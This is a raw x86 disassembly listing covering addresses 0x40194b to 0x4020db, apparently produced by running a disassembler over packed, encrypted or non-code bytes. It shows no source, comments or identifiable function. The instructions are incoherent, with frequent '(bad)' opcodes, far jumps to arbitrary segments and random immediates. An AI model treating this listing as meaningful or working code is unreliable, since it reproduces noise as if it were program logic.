  40194b:	arpl   WORD PTR [ebx+ebp*2+0x6a5e8454],si
  401952:	call   0x5299:0xcdf10c2f
  401959:	mov    fs,WORD PTR [ebp+0x17]
  40195c:	int    0xfa
  40195e:	sbb    al,0x20
  401960:	stos   DWORD PTR es:[edi],eax
  401961:	push   ebx
  401962:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401963:	std    
  401964:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401966:	sub    bh,BYTE PTR [esi]
  401968:	inc    edx
  401969:	jne    0x40192d
  40196b:	mov    ch,0xda
  40196d:	call   0x2eaa:0xcb5c3553
  401974:	rcr    DWORD PTR [eax],0x4e
  401977:	inc    ecx
  401978:	pop    ds
  401979:	xchg   ebp,eax
  40197a:	mov    esi,0xbb6ae67c
  40197f:	mov    al,BYTE PTR [eax+ebx*2]
  401982:	fs inc edx
  401984:	sub    bh,bh
  401986:	lds    ecx,FWORD PTR [esi-0x30]
  401989:	scas   ax,WORD PTR es:[di]
  40198c:	aad    0xca
  40198e:	add    al,0x9
  401990:	ret    0x95e1
  401993:	or     DWORD PTR [ebx+0x327fb0bf],0x3a7c3105
  40199d:	adc    al,0x50
  40199f:	stos   DWORD PTR es:[edi],eax
  4019a0:	popf   
  4019a1:	jp     0x4019f3
  4019a3:	call   0x647:0x5691d3d0
  4019aa:	rcr    cl,0x98
  4019ad:	jmp    DWORD PTR [ecx+0x38]
  4019b0:	mov    cs,esi
  4019b2:	jno    0x4019b6
  4019b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019b5:	sti    
  4019b6:	xchg   esi,eax
  4019b7:	add    BYTE PTR [ebx+0x3b],0xca
  4019bb:	mov    ebp,es
  4019bd:	lods   al,BYTE PTR fs:[esi]
  4019bf:	sub    ebp,DWORD PTR [esi+0x795a9107]
  4019c5:	(bad)  
  4019c6:	outs   dx,BYTE PTR ds:[esi]
  4019c7:	adc    ah,cl
  4019c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019ca:	int3   
  4019cb:	xchg   BYTE PTR [ebp-0x3b8f3717],bl
  4019d1:	ss test al,0xda
  4019d4:	sar    DWORD PTR [edi],0xe
  4019d7:	arpl   WORD PTR [ebx-0x5fdf7549],di
  4019dd:	(bad)  
  4019de:	jmp    0x3033b354
  4019e3:	(bad)  
  4019e5:	(bad)  
  4019e6:	lods   al,BYTE PTR gs:[esi]
  4019e8:	adc    eax,0xb6daeee2
  4019ed:	and    ah,BYTE PTR [ecx+0x37995f7e]
  4019f3:	mov    bl,BYTE PTR [eax+0x7b055160]
  4019f9:	popa   
  4019fa:	xor    BYTE PTR [edx-0x4a6bd24d],cl
  401a00:	cmp    DWORD PTR [edx+0x2563d40a],ebx
  401a06:	adc    eax,0xba253ffb
  401a0b:	add    BYTE PTR [esi+0x6c],bl
  401a0e:	jae    0x401a30
  401a10:	repz idiv BYTE PTR [edx+0x2b]
  401a14:	dec    DWORD PTR [ebp+0x70]
  401a17:	addr16 pusha 
  401a19:	jnp    0x401a88
  401a1b:	fisubr DWORD PTR [edx]
  401a1d:	add    BYTE PTR gs:[ecx-0x2d],al
  401a21:	dec    esp
  401a22:	(bad)  
  401a23:	cs jnp 0x4019df
  401a26:	out    0x65,al
  401a28:	xor    dh,BYTE PTR [ecx-0x17]
  401a2b:	and    DWORD PTR [edx-0x4358789b],edx
  401a31:	push   ecx
  401a32:	mov    ds:0xa5168453,eax
  401a37:	(bad)  
  401a38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a39:	jl     0x401a7e
  401a3b:	cmp    BYTE PTR [ebx],dl
  401a3d:	pop    edx
  401a3e:	cmp    BYTE PTR [edx+0x41],bl
  401a41:	test   al,0xb4
  401a43:	pop    edi
  401a44:	sub    al,0x6c
  401a46:	push   0xedb2fc5c
  401a4b:	sbb    DWORD PTR [ebx-0x5bc466ba],ebx
  401a51:	stos   DWORD PTR es:[edi],eax
  401a52:	retf   
  401a53:	sub    al,BYTE PTR [edi+0x6c]
  401a56:	(bad)  
  401a57:	es jle 0x401a52
  401a5a:	push   cs
  401a5b:	call   0xc778:0x34af1eee
  401a62:	xor    edx,edx
  401a64:	adc    esi,DWORD PTR [edi+0x25]
  401a67:	shl    DWORD PTR [ecx],0xc
  401a6a:	loop   0x401a1d
  401a6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a6d:	and    eax,DWORD PTR [edi-0x7c7f0a47]
  401a73:	jno    0x401a46
  401a75:	adc    al,0xae
  401a77:	and    BYTE PTR [ebp-0x16],ah
  401a7a:	or     ch,BYTE PTR [edx]
  401a7c:	div    BYTE PTR [ebp-0x1f]
  401a7f:	les    edi,FWORD PTR [edi+0xa0f89eb]
  401a85:	sub    BYTE PTR [esi],bl
  401a87:	in     al,0x71
  401a89:	cdq    
  401a8a:	arpl   WORD PTR [ecx],di
  401a8c:	adc    ebp,esp
  401a8e:	jae    0x401ab8
  401a90:	mov    dl,0x5c
  401a92:	sahf   
  401a93:	and    DWORD PTR [edi+ecx*1],esi
  401a96:	mov    esi,0xadb32db5
  401a9b:	das    
  401a9c:	push   0xffffff99
  401a9e:	stos   BYTE PTR es:[edi],al
  401a9f:	inc    edi
  401aa0:	lods   al,BYTE PTR ds:[esi]
  401aa1:	mov    bh,0xd4
  401aa3:	ds push ss
  401aa5:	jl     0x401a6e
  401aa7:	(bad)  
  401aa8:	hlt    
  401aa9:	add    cl,dl
  401aab:	xchg   DWORD PTR [eax+0x5a5cf36b],ebx
  401ab1:	call   0x8473:0x3db07e63
  401ab8:	mov    bl,0x3d
  401aba:	cmp    al,0x1d
  401abc:	jg     0x401aa3
  401abe:	xchg   edi,eax
  401abf:	mov    edi,0xcfb9c0f2
  401ac4:	scas   eax,DWORD PTR es:[edi]
  401ac5:	imul   edi,DWORD PTR [edi],0x24e66695
  401acb:	xor    DWORD PTR [edi],ecx
  401acd:	aad    0x2a
  401acf:	dec    edi
  401ad0:	jmp    0x401a8d
  401ad2:	ficom  DWORD PTR [eax+0x79ce0c85]
  401ad8:	push   esi
  401ad9:	into   
  401ada:	sbb    DWORD PTR [esi+0x40],edx
  401add:	dec    ebx
  401ade:	ins    BYTE PTR es:[edi],dx
  401adf:	push   ss
  401ae0:	push   0x30097692
  401ae5:	or     eax,0x8b2186d5
  401aea:	inc    edx
  401aeb:	(bad)  
  401aec:	je     0x401b51
  401aee:	out    0x55,al
  401af0:	test   DWORD PTR [ecx],0x32529c6c
  401af6:	add    eax,0xf0363341
  401afb:	fcom   st(0)
  401afd:	das    
  401afe:	das    
  401aff:	fsub   st(6),st
  401b01:	arpl   WORD PTR [ebx+0x28eea30b],ax
  401b07:	hlt    
  401b08:	mov    esp,fs
  401b0a:	fdivr  QWORD PTR [edi+eiz*8]
  401b0d:	aam    0xfa
  401b0f:	es aad 0x2f
  401b12:	mov    ds:0x52f4ce2c,eax
  401b17:	xor    DWORD PTR [esi+0x2],0xffffff82
  401b1b:	lea    edx,[eax+0x7b]
  401b1e:	ret    
  401b1f:	inc    eax
  401b20:	adc    DWORD PTR [eax],ecx
  401b22:	ins    BYTE PTR es:[edi],dx
  401b23:	adc    bl,ch
  401b25:	cmc    
  401b26:	adc    ah,BYTE PTR [ebx+eiz*8]
  401b29:	and    BYTE PTR ds:0xae96cdaa,bl
  401b2f:	test   eax,0xdfaede3f
  401b34:	ds or  eax,0x3c3dda8f
  401b3a:	cmp    al,0x7
  401b3c:	add    ax,dx
  401b3f:	sub    al,0x85
  401b41:	in     al,0x9f
  401b43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b44:	inc    ebx
  401b45:	or     edx,0x3e
  401b48:	pop    ebp
  401b49:	or     bh,BYTE PTR ss:[eax-0x5]
  401b4d:	jle    0x401b36
  401b4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b50:	ins    DWORD PTR es:[edi],dx
  401b51:	inc    edx
  401b52:	mov    eax,ds:0xae39de07
  401b57:	sub    edx,edi
  401b59:	sbb    ebx,edx
  401b5b:	dec    ebp
  401b5c:	mov    ebp,0xac26906e
  401b61:	pop    edx
  401b62:	sbb    dh,ch
  401b64:	scas   al,BYTE PTR es:[edi]
  401b65:	cdq    
  401b66:	(bad)  
  401b67:	inc    BYTE PTR [edi-0x30]
  401b6a:	arpl   WORD PTR [eax-0x29],dx
  401b6d:	adc    esp,DWORD PTR [esi]
  401b6f:	popa   
  401b70:	push   ecx
  401b71:	xchg   edx,eax
  401b72:	mov    eax,0x4ce94763
  401b77:	dec    ebx
  401b78:	lea    esp,[esi+0x59]
  401b7b:	iret   
  401b7c:	jns    0x401b85
  401b7e:	or     al,0x57
  401b80:	sub    BYTE PTR [edx+esi*1+0x67],0x88
  401b85:	mov    dh,0xcc
  401b87:	je     0x401b3c
  401b89:	ins    BYTE PTR es:[edi],dx
  401b8a:	dec    ebp
  401b8b:	inc    ebp
  401b8c:	shl    BYTE PTR [eax+0x5a],1
  401b8f:	xchg   DWORD PTR [ecx-0x55c2fc41],edi
  401b95:	inc    esi
  401b96:	xor    eax,0x1615046a
  401b9b:	ja     0x401bc2
  401b9d:	int3   
  401b9e:	xchg   esi,eax
  401b9f:	sub    esi,DWORD PTR [esi-0x5a]
  401ba2:	xchg   edi,eax
  401ba3:	and    DWORD PTR [esi],edi
  401ba5:	jmp    0x551aecc0
  401baa:	or     al,0x79
  401bac:	inc    ebx
  401bad:	or     bh,BYTE PTR [eax+0x758dba7]
  401bb3:	neg    DWORD PTR [ebx]
  401bb5:	mov    ds:0xd78f8774,al
  401bba:	repz aad 0x56
  401bbd:	arpl   WORD PTR [ebp+0x799aae8d],si
  401bc3:	and    DWORD PTR [edx+0x7eaa0477],ecx
  401bc9:	adc    DWORD PTR [eax-0x79ae09f5],eax
  401bcf:	imul   edx,DWORD PTR [edi-0x468457df],0xd7a8fa5d
  401bd9:	js     0x401bad
  401bdb:	mov    al,ds:0x149db1c0
  401be0:	xchg   esp,eax
  401be1:	add    edx,edi
  401be3:	scas   al,BYTE PTR es:[edi]
  401be4:	add    al,0xd9
  401be6:	sub    DWORD PTR ds:[esp+edx*8],ebp
  401bea:	or     al,0xf6
  401bec:	xor    BYTE PTR [ebp-0x56c80b19],bl
  401bf2:	ins    BYTE PTR es:[edi],dx
  401bf3:	repz jno 0x401c0c
  401bf6:	push   0x229b6898
  401bfb:	xor    esp,ebx
  401bfd:	add    edi,DWORD PTR [esi]
  401bff:	es mov eax,0x735f75c2
  401c05:	stos   BYTE PTR es:[edi],al
  401c06:	daa    
  401c07:	push   0x23
  401c09:	add    eax,DWORD PTR [edx-0x62]
  401c0c:	lods   eax,DWORD PTR ds:[esi]
  401c0d:	arpl   WORD PTR [edx+0x248e973c],di
  401c13:	sbb    eax,0x7c042351
  401c18:	es stos WORD PTR es:[edi],ax
  401c1b:	adc    dl,BYTE PTR [ecx]
  401c1d:	repnz dec esi
  401c1f:	into   
  401c20:	jge    0x401c7b
  401c22:	arpl   di,si
  401c24:	add    bl,BYTE PTR [edi+0x2346aac9]
  401c2a:	sbb    eax,0x2ca864e6
  401c2f:	cli    
  401c30:	and    BYTE PTR ds:0x811d030d,dl
  401c36:	into   
  401c37:	jg     0x401c80
  401c39:	mov    DWORD PTR [edi],ebp
  401c3b:	sbb    BYTE PTR [esi+eiz*2],al
  401c3e:	jp     0x401c16
  401c40:	ret    
  401c41:	sbb    ebp,DWORD PTR ds:0x98c949a8
  401c47:	pop    eax
  401c48:	xchg   BYTE PTR [edx+edi*4+0x55],ch
  401c4c:	je     0x401be1
  401c4e:	jg     0x401c74
  401c50:	std    
  401c51:	mov    ah,0x8e
  401c53:	jns    0x401be3
  401c55:	loop   0x401c14
  401c57:	jl     0x401ca3
  401c59:	imul   edi,esp,0x60
  401c5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c5d:	(bad)  [edi]
  401c5f:	rcr    BYTE PTR [esi+0x11e80ab9],1
  401c65:	sbb    DWORD PTR [eax],eax
  401c67:	cdq    
  401c68:	in     eax,dx
  401c69:	mov    ecx,0x6f747f86
  401c6e:	inc    ebx
  401c6f:	add    ebp,ebp
  401c71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c72:	xor    ebx,ebp
  401c74:	inc    ebx
  401c75:	shl    BYTE PTR [ebp+0x30],cl
  401c78:	inc    esp
  401c79:	scas   eax,DWORD PTR es:[edi]
  401c7a:	std    
  401c7b:	cld    
  401c7c:	and    edi,DWORD PTR [ecx+0x1d]
  401c7f:	mov    WORD PTR [ecx-0x443ff763],?
  401c85:	pop    es
  401c86:	mov    esi,0x5f6ef84
  401c8b:	xchg   BYTE PTR [esi-0x46],bl
  401c8e:	aaa    
  401c8f:	push   0xffffffdd
  401c91:	push   0xffffff88
  401c93:	(bad)  
  401c94:	rcr    BYTE PTR [edx+esi*1-0x65],1
  401c98:	je     0x401c79
  401c9a:	test   al,0x13
  401c9c:	jb     0x401c8a
  401c9e:	shl    bh,0x8e
  401ca1:	mov    ebx,0x7467d1fc
  401ca6:	fist   DWORD PTR [edx+0x73521116]
  401cac:	loope  0x401d22
  401cae:	push   0xffffffd5
  401cb0:	xor    DWORD PTR [ebp-0x471eb151],esp
  401cb6:	or     al,0xc8
  401cb8:	in     eax,dx
  401cb9:	cmp    DWORD PTR [ecx],edx
  401cbb:	cmc    
  401cbc:	xchg   esp,eax
  401cbd:	(bad)  
  401cbe:	mov    al,0xc7
  401cc0:	out    dx,eax
  401cc1:	xchg   edx,eax
  401cc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401cc3:	les    eax,FWORD PTR [edi]
  401cc5:	lods   al,BYTE PTR ds:[esi]
  401cc6:	pop    edx
  401cc7:	push   eax
  401cc8:	dec    eax
  401cc9:	or     esi,esp
  401ccb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ccc:	sbb    DWORD PTR [esi+0x66994224],0xffffff86
  401cd3:	retf   0x522c
  401cd6:	test   BYTE PTR [edi-0x21d29d2c],al
  401cdc:	jmp    0x48f:0xe9aa9662
  401ce3:	popa   
  401ce4:	shr    al,0x52
  401ce7:	int    0x63
  401ce9:	dec    esp
  401cea:	inc    esp
  401ceb:	jp     0x401cb0
  401ced:	stos   BYTE PTR es:[edi],al
  401cee:	fisubr WORD PTR [ebp-0x7e]
  401cf1:	repnz fistp DWORD PTR [ecx+eax*2-0x750d4853]
  401cf9:	idiv   DWORD PTR [ecx+0x6e]
  401cfc:	out    0x42,eax
  401cfe:	ins    BYTE PTR es:[edi],dx
  401cff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d00:	bnd jge 0x401d82
  401d03:	loopne 0x401d77
  401d05:	xchg   esp,eax
  401d06:	mov    edi,0xfeee63b6
  401d0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d0c:	out    0xb4,al
  401d0e:	push   ds
  401d0f:	out    0x3d,al
  401d11:	rcr    al,0x96
  401d14:	aad    0xdd
  401d16:	(bad)  
  401d17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d18:	inc    esp
  401d19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d1a:	lods   eax,DWORD PTR cs:[esi]
  401d1c:	ss mov ecx,0xc1e97532
  401d22:	sti    
  401d23:	outs   dx,BYTE PTR ds:[esi]
  401d24:	(bad)  
  401d25:	pop    edi
  401d26:	push   ebp
  401d27:	mov    ecx,0x3421a62d
  401d2c:	(bad)  
  401d2d:	jp     0x401da4
  401d2f:	sbb    dh,bh
  401d31:	inc    ecx
  401d32:	fwait
  401d33:	gs popf 
  401d35:	and    ecx,DWORD PTR [ebx+eax*4-0x41]
  401d39:	mov    cl,0xaa
  401d3b:	popa   
  401d3c:	xor    BYTE PTR [ebx],0xf4
  401d3f:	push   0xffffffef
  401d41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d42:	xchg   BYTE PTR [edi],dh
  401d44:	jmp    0x7de4b08d
  401d49:	stos   DWORD PTR es:[edi],eax
  401d4a:	ret    0x4289
  401d4d:	lahf   
  401d4e:	inc    edi
  401d4f:	nop
  401d50:	aaa    
  401d51:	mov    al,0x18
  401d53:	cmp    DWORD PTR [eax-0x3d1d217d],0xed5b8488
  401d5d:	xor    BYTE PTR [ebp-0x3f],dl
  401d60:	imul   edi,ebp,0xffffffa3
  401d63:	outs   dx,DWORD PTR ds:[esi]
  401d64:	sub    eax,0x8330ebbe
  401d69:	fisttp QWORD PTR [ebx]
  401d6b:	fimul  WORD PTR [edi+0x5f28d7e9]
  401d71:	xchg   ebx,eax
  401d72:	jno    0x401d5f
  401d74:	jae    0x401d35
  401d76:	jmp    FWORD PTR [eax+0x175c7d8e]
  401d7c:	outs   dx,DWORD PTR ds:[esi]
  401d7d:	push   eax
  401d7e:	mov    eax,ds:0xa4bdab7b
  401d83:	pop    ds
  401d84:	fdiv   st(2),st
  401d86:	lea    eax,[esi+0x34]
  401d89:	adc    esp,ecx
  401d8b:	lea    esi,[eax+ebx*4]
  401d8e:	fist   DWORD PTR [ecx+0x29]
  401d91:	lods   eax,DWORD PTR ds:[esi]
  401d92:	leave  
  401d93:	stc    
  401d94:	mov    eax,0x282c1176
  401d99:	std    
  401d9a:	out    0x2a,al
  401d9c:	adc    al,BYTE PTR [bp+di+0x381d]
  401da1:	fcom   st(5)
  401da3:	fld    QWORD PTR ss:[eax+0x4f]
  401da7:	retf   0x688
  401daa:	imul   eax,DWORD PTR [ebx],0x1fe366ab
  401db0:	xchg   edi,eax
  401db1:	xor    edx,DWORD PTR [esi]
  401db3:	pop    eax
  401db4:	cdq    
  401db5:	stc    
  401db6:	hlt    
  401db7:	lds    ebx,FWORD PTR [ebx+0x461ba069]
  401dbd:	stos   BYTE PTR es:[edi],al
  401dbe:	mov    ds:0x5a30cee3,eax
  401dc3:	ins    BYTE PTR es:[edi],dx
  401dc4:	je     0x401e2a
  401dc6:	cmp    BYTE PTR [ebp+0x23d9b325],bl
  401dcc:	clc    
  401dcd:	mov    ss,ebp
  401dcf:	movsx  ebx,BYTE PTR [eax-0x3]
  401dd3:	xchg   edi,eax
  401dd4:	cli    
  401dd5:	fiadd  DWORD PTR [ebp+0x2]
  401dd8:	push   esi
  401dd9:	and    al,0xdb
  401ddb:	cs ss popf 
  401dde:	gs pop es
  401de0:	mov    esi,0xd51c6d76
  401de5:	push   0xb0fa0248
  401dea:	lods   al,BYTE PTR ds:[esi]
  401deb:	push   ecx
  401dec:	mov    BYTE PTR [edx+0x51d5ec5a],ch
  401df2:	rcl    BYTE PTR [eax],cl
  401df4:	pop    ds
  401df5:	push   esi
  401df6:	pop    ds
  401df7:	dec    edi
  401df8:	inc    ebp
  401df9:	mov    ds:0xb720ea2d,al
  401dfe:	loopne 0x401e14
  401e00:	leave  
  401e01:	iret   
  401e02:	jnp    0x401e35
  401e04:	test   eax,0x12a8cc10
  401e09:	xor    eax,ebx
  401e0b:	jge    0x401dea
  401e0d:	sahf   
  401e0e:	jg     0x401dbe
  401e10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e11:	imul   ecx,DWORD PTR [eax-0x400fc738],0x6dc8c9c5
  401e1b:	jmp    0x401dce
  401e1d:	sahf   
  401e1e:	fucomi st,st(1)
  401e20:	mov    dl,0x7a
  401e22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e23:	pop    edi
  401e24:	add    DWORD PTR [esi+0x0],ecx
  401e27:	xor    al,BYTE PTR ds:0x1e6d3c5d
  401e2d:	inc    esp
  401e2e:	jno    0x401e63
  401e30:	mov    ch,0xec
  401e32:	mov    edi,0x398e0a9
  401e37:	dec    ebp
  401e38:	pop    ebx
  401e39:	xor    DWORD PTR [edi],edi
  401e3b:	jo     0x401df2
  401e3d:	inc    esp
  401e3e:	or     DWORD PTR [ebp+0x3dd8b5a5],esi
  401e44:	loope  0x401e31
  401e46:	fnstcw WORD PTR ds:[ecx+0x6]
  401e4a:	cmp    DWORD PTR [eax],ecx
  401e4c:	ret    
  401e4d:	call   0x7b6e:0x3a6b00a3
  401e54:	sub    al,0x5f
  401e56:	pop    es
  401e57:	mov    ?,WORD PTR [edx]
  401e59:	lahf   
  401e5a:	shl    BYTE PTR [eax-0x3a],cl
  401e5d:	pop    edx
  401e5e:	aam    0x55
  401e60:	jmp    0x177f:0x669608c7
  401e67:	inc    esi
  401e68:	imul   BYTE PTR [ebp+0x23e1e047]
  401e6e:	lds    esp,FWORD PTR [esi-0x63]
  401e71:	add    eax,0xe531d29f
  401e76:	or     al,0x6b
  401e78:	into   
  401e79:	jp     0x401e6d
  401e7b:	hlt    
  401e7c:	stos   BYTE PTR es:[edi],al
  401e7d:	aas    
  401e7e:	mov    ah,0x56
  401e80:	(bad)  
  401e81:	cmp    edi,DWORD PTR [ebp+0x2e]
  401e84:	xchg   ecx,eax
  401e85:	jne    0x401e4a
  401e87:	mov    edi,0xe9dbf72c
  401e8c:	(bad)  
  401e8e:	mov    ss,ecx
  401e90:	pop    edi
  401e91:	cmp    BYTE PTR [edx+0x375a9519],al
  401e97:	jb     0x401f0d
  401e99:	sub    DWORD PTR [ebp+0x5f],0xffffff92
  401e9d:	ficomp DWORD PTR [esi]
  401e9f:	jmp    0x4a7f:0x47406d7f
  401ea6:	or     eax,0x7dda1d2c
  401eab:	mov    ebx,0xd38df5a5
  401eb0:	pop    ebp
  401eb1:	dec    dx
  401eb3:	fwait
  401eb4:	in     eax,0xdf
  401eb6:	stos   DWORD PTR es:[edi],eax
  401eb7:	add    ah,BYTE PTR [ebp-0x5be11711]
  401ebd:	sahf   
  401ebe:	add    al,0x64
  401ec0:	push   0x7b1a6f62
  401ec5:	inc    esp
  401ec6:	loopne 0x401e58
  401ec8:	fst    DWORD PTR [edi]
  401eca:	mov    edi,0x2f35c3de
  401ecf:	and    al,0xf2
  401ed1:	in     al,dx
  401ed2:	sbb    eax,0x6d8a3d00
  401ed7:	loop   0x401edb
  401ed9:	inc    esp
  401eda:	jp     0x401ebc
  401edc:	push   edi
  401edd:	push   edi
  401ede:	or     eax,0x17160a34
  401ee3:	jecxz  0x401f5d
  401ee5:	and    al,BYTE PTR [ecx-0x40]
  401ee8:	pusha  
  401ee9:	(bad)  
  401eea:	and    BYTE PTR [eax-0x65f38b06],0x7e
  401ef1:	and    ah,bl
  401ef3:	fidiv  WORD PTR [edx+0x1f]
  401ef6:	mov    ah,0x84
  401ef8:	or     edx,DWORD PTR [edi+0x495e30a5]
  401efe:	xor    al,0x38
  401f01:	aam    0xdf
  401f03:	mov    eax,ds:0xd076bf09
  401f08:	cmc    
  401f09:	mov    cs,WORD PTR [ecx+edx*8+0x22]
  401f0d:	mov    eax,ds:0xba9dda52
  401f12:	mov    esi,0xa5d5e61f
  401f17:	cmp    al,0x86
  401f19:	pop    ds
  401f1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f1b:	or     BYTE PTR [edx+eiz*8],dh
  401f1e:	mov    ecx,0x93ca6c2
  401f23:	jmp    0x4eb6:0x4c387ac2
  401f2a:	(bad)  
  401f2b:	cdq    
  401f2c:	call   0x6e794fab
  401f31:	push   ss
  401f32:	fld    st(3)
  401f34:	cli    
  401f35:	mov    fs,WORD PTR [eax-0x666bb01e]
  401f3b:	icebp  
  401f3c:	push   esi
  401f3d:	mov    fs,WORD PTR [edi+0x380abe2b]
  401f43:	jns    0x401f93
  401f45:	stos   BYTE PTR es:[edi],al
  401f46:	inc    edx
  401f47:	mov    esi,0xd2ad6f7b
  401f4c:	jp     0x401ed0
  401f4e:	cmc    
  401f4f:	jecxz  0x401f4d
  401f51:	mov    es,WORD PTR [edi-0x35ea0c00]
  401f57:	sub    ch,BYTE PTR [eax-0x407cf8c8]
  401f5d:	ret    
  401f5e:	in     eax,0xa0
  401f60:	ins    DWORD PTR es:[edi],dx
  401f61:	push   eax
  401f62:	push   ecx
  401f63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f64:	and    al,0xad
  401f66:	in     al,dx
  401f67:	push   cs
  401f68:	(bad)  
  401f69:	div    BYTE PTR [ebx-0x32]
  401f6c:	or     eax,0xc81838dd
  401f71:	mov    ebp,0xa5cd3807
  401f76:	and    BYTE PTR [eax],bh
  401f78:	push   DWORD PTR [ecx]
  401f7a:	mov    dh,0x7a
  401f7c:	into   
  401f7d:	cmp    ah,ah
  401f7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f80:	pop    DWORD PTR [edx+ebx*8]
  401f83:	ret    
  401f84:	mov    esi,0xd829910f
  401f89:	mov    ch,0x77
  401f8b:	(bad)  
  401f8c:	sbb    bl,BYTE PTR [ecx+ecx*2-0x1c]
  401f90:	out    0xa8,al
  401f92:	(bad)  
  401f93:	(bad)  [ebx-0x42]
  401f96:	cmp    BYTE PTR [eax-0x40],ah
  401f99:	scas   eax,DWORD PTR es:[edi]
  401f9a:	popa   
  401f9b:	clc    
  401f9c:	inc    esi
  401f9d:	mov    ds:0x794c3fc1,eax
  401fa2:	mov    dh,0x79
  401fa4:	addr16 push es
  401fa6:	xor    eax,0x1c28a129
  401fab:	jns    0x401fe5
  401fad:	repnz loopne 0x401fa6
  401fb0:	loop   0x401f76
  401fb2:	les    esi,FWORD PTR [edi-0xf039f2c]
  401fb8:	clc    
  401fb9:	in     al,0x2
  401fbb:	addr16 loope 0x401fc4
  401fbe:	sub    al,0x62
  401fc0:	push   ebx
  401fc1:	xchg   ebp,eax
  401fc2:	scas   eax,DWORD PTR es:[edi]
  401fc3:	mov    dh,0x9f
  401fc5:	pop    ebx
  401fc6:	(bad)  
  401fc7:	mov    bh,0x1e
  401fc9:	pop    ecx
  401fca:	mov    bh,0xe8
  401fcc:	inc    eax
  401fcd:	pusha  
  401fce:	jo     0x401fb2
  401fd0:	cmp    bh,bh
  401fd2:	sub    eax,0xff44233c
  401fd7:	mov    edi,0x8cd24678
  401fdc:	push   esi
  401fdd:	or     ebp,DWORD PTR [ecx-0x50]
  401fe0:	jmp    0x401fc4
  401fe2:	(bad)  
  401fe4:	pop    edi
  401fe5:	cmp    eax,0x7ed76bae
  401fea:	xor    al,0x83
  401fec:	add    ebx,DWORD PTR [ecx+0x4e]
  401fef:	out    dx,eax
  401ff0:	jnp    0x401fb6
  401ff2:	dec    ebp
  401ff3:	jl     0x40202c
  401ff5:	inc    esp
  401ff6:	sbb    cl,BYTE PTR [eax]
  401ff8:	in     al,0xce
  401ffa:	int    0x27
  401ffc:	pop    ebp
  401ffd:	dec    eax
  401ffe:	pushf  
  401fff:	push   eax
  402000:	loopne 0x402060
  402002:	test   DWORD PTR [edx+0x9],ecx
  402005:	adc    dh,BYTE PTR [eax+0x96bdeb1]
  40200b:	sbb    esp,ecx
  40200d:	ins    BYTE PTR es:[edi],dx
  40200e:	mov    dl,0xce
  402010:	repz in eax,dx
  402012:	loopne 0x401f97
  402014:	inc    ebp
  402015:	fwait
  402016:	push   edx
  402017:	repnz aas 
  402019:	jae    0x40206d
  40201b:	retf   0x88e5
  40201e:	adc    edx,esi
  402020:	mov    BYTE PTR [edx],ah
  402022:	and    ebp,DWORD PTR [eax-0x20f279e9]
  402028:	pop    esp
  402029:	imul   edi,DWORD PTR [edi+0x7f],0xffffffcc
  40202d:	shr    ebx,cl
  40202f:	scas   al,BYTE PTR es:[edi]
  402030:	mov    ecx,DWORD PTR [esi]
  402032:	dec    eax
  402033:	sub    bl,BYTE PTR [ebx-0x31]
  402036:	and    ecx,DWORD PTR [edx+ecx*4-0x75e2a51f]
  40203d:	mov    ds:0x1619319c,al
  402042:	pop    ecx
  402043:	jecxz  0x40208f
  402045:	dec    edx
  402046:	js     0x402019
  402048:	and    ah,BYTE PTR gs:[ebp+0x6d]
  40204c:	repnz pop edi
  40204e:	and    bh,BYTE PTR [esi+0x1b]
  402051:	sbb    ebp,DWORD PTR [edx]
  402053:	(bad)  
  402055:	outs   dx,DWORD PTR ds:[esi]
  402056:	xlat   BYTE PTR ds:[ebx]
  402057:	into   
  402058:	xor    al,0x78
  40205a:	mov    dh,0x6d
  40205c:	rol    cl,0xd6
  40205f:	(bad)  
  402060:	call   0xd031:0x6afcc84c
  402067:	mov    ebx,0xf89bde7c
  40206c:	(bad)  
  40206e:	mov    WORD PTR [edx-0x3c03f3a1],cs
  402074:	scas   al,BYTE PTR es:[edi]
  402075:	iret   
  402076:	imul   esp,DWORD PTR [edi+eiz*8-0xc769ca0],0x6e9c404c
  402081:	mov    eax,ds:0x62b35456
  402086:	push   edi
  402087:	jle    0x402105
  402089:	test   DWORD PTR [esi],0x804f1fdb
  40208f:	jne    0x402051
  402091:	jno    0x4020c6
  402093:	fst    DWORD PTR [ecx+0x71f21389]
  402099:	push   esp
  40209a:	sub    DWORD PTR [ecx+0x4000875e],0xe2876a2a
  4020a4:	ds std 
  4020a6:	fdivrp st(1),st
  4020a8:	and    al,0x8b
  4020aa:	xor    dh,BYTE PTR ds:0x23bab94
  4020b0:	jmp    0x166e:0x68aae72c
  4020b7:	loop   0x402137
  4020b9:	bound  edx,QWORD PTR [edi-0x27953e8a]
  4020bf:	xor    BYTE PTR [eax+eiz*4-0x23c8ccab],dh
  4020c6:	xchg   ebx,eax
  4020c7:	stc    
  4020c8:	jge    0x402102
  4020ca:	inc    edi
  4020cb:	push   ecx
  4020cc:	or     eax,0x9bafed96
  4020d1:	ins    BYTE PTR es:[edi],dx
  4020d2:	add    al,0xb7
  4020d4:	and    DWORD PTR [edi-0x56],ecx
  4020d7:	inc    esp
  4020d8:	adc    al,0x77
  4020da:	(bad)  
  4020db:	xchg   esp,eax
